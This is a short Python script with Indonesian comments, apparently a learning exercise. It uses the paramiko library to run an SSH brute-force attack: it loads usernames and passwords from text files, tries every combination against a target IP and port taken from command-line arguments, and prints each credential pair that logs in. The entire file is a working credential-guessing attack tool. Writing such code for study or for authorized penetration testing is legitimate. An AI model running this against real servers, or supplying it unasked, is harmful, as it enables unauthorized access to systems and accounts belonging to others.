import sys # untuk baca argumen ketika run 
from getopt import getopt #untuk ambil value dari argument 
import paramiko # untuk bikin ssh client 


# print("hello")

ip = ""
port = 0
usernameList = []
passwordList = []


def appendFromFile(fileSource):
    file =  open(fileSource, "r")
    # print(file.readlines())

    list = []

    for line in file.readlines():

        print(line.strip("\n"))
        list.append(line.strip("\n"))

    return list


def establishConnection():
    for u in usernameList:
        for p in passwordList:
            ssh_client = paramiko.SSHClient()
            
            # set key 
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # coba connect 
            # ip, port, username, password
            # ssh_client.connect(ip, port, u, p)

            try:
                ssh_client.connect(ip, port, u, p)
                print(f"succesfully connected with credential {u}:{p}")
            except Exception as e:
                print(f"{u}:{p}, error!~ {e}")

            finally:
                ssh_client.close()





def ssh():

    global usernameList, passwordList

    usernameList = appendFromFile("usernames.txt")
    
    passwordList = appendFromFile("passwords.txt")
    
    #bikin connection ke server
    establishConnection()


def main():
    global ip, port

    # print(sys.argv[1:])
    # paramter: list argumen kita, ada dua option : short dan long 
    opts, argv = getopt(sys.argv[1:], "i:p:h", ["ip=", "port=", "help"])
    # print(f"Opts: {opts}")
    # print(f"Argv: ")

    for opt, value in opts:
        print(f"opt: {opt}, value: {value}")

        if opt == "-i" or opt == "-ip":
            ip = value
        if opt == "-p" or opt == "-port":
            port = int(value)

    print(f"IP: {ip}")
    print(f"PORT: {port}")

    if ip == "":
        print("Ip must be filled !")
        exit()
    elif port == 0:
        port = 22

    ssh()


main()
